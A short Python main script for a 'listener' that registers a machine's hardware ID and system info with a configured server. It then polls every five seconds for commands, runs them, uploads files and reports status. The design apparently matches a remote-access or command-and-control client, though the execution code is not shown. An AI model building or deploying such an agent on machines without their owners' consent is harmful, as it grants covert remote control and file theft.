'''Main script used as a lisener'''
import configparser
import time
from classes.sys_info import SystemInfo
from classes.api_requests import Requests


def start_listen(sys, api):
    '''Method used to start listening new cmds'''
    while True:
        try:
            cmds = api.get_command(api.setup_data['id'])
            for cmd in cmds:
                sys.run_cmd(cmd)
                api.upload_file()
                api.update_cmd_status(cmd['id'])
        except: # pylint: disable=W0702
            api.post_new_setup(sys.info)
        time.sleep(5)

def main():
    ''' Main function which is used to initialized classes'''
    config = configparser.ConfigParser()
    config.read('settings/config.ini')

    sys = SystemInfo()

    api = Requests(sys.info['hwid'], config['HOST'])
    api.post_new_setup(sys.info)

    start_listen(sys, api)

if __name__ == "__main__":
    main()
